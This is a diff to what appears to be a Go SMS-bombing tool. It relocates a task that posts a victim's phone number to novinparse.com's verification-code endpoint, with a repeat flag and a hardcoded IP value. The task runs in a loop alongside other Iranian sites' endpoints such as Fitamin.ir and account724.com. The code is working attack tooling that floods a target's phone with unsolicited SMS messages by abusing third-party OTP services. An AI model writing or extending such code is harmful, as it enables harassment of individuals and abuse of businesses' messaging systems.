@@ -483,6 +483,20 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
 		
 
+		// novinparse.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("Action", "SendVerifyCode")
+				formData.Set("mobile", phone)
+				formData.Set("verifyCode", "")
+				formData.Set("repeatFlag", "true")
+				formData.Set("Language", "FA")
+				formData.Set("ipaddress", "95.38.60.151")
+				sendFormRequest(c, ctx, "https://novinparse.com/page/pageaction.aspx", formData, &wg, ch) 
+			}
+		}(client) 
 
                // Fitamin.ir (JSON Request)
                wg.Add(1)
@@ -1152,21 +1166,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("type", "mobile")
 				formData.Set("input", phone)
 				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// novinparse.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("Action", "SendVerifyCode")
-				formData.Set("mobile", phone)
-				formData.Set("verifyCode", "")
-				formData.Set("repeatFlag", "true")
-				formData.Set("Language", "FA")
-				formData.Set("ipaddress", "95.38.60.151")
-				sendFormRequest(c, ctx, "https://novinparse.com/page/pageaction.aspx", formData, &wg, ch) 
 			}
 		}(client) 
 
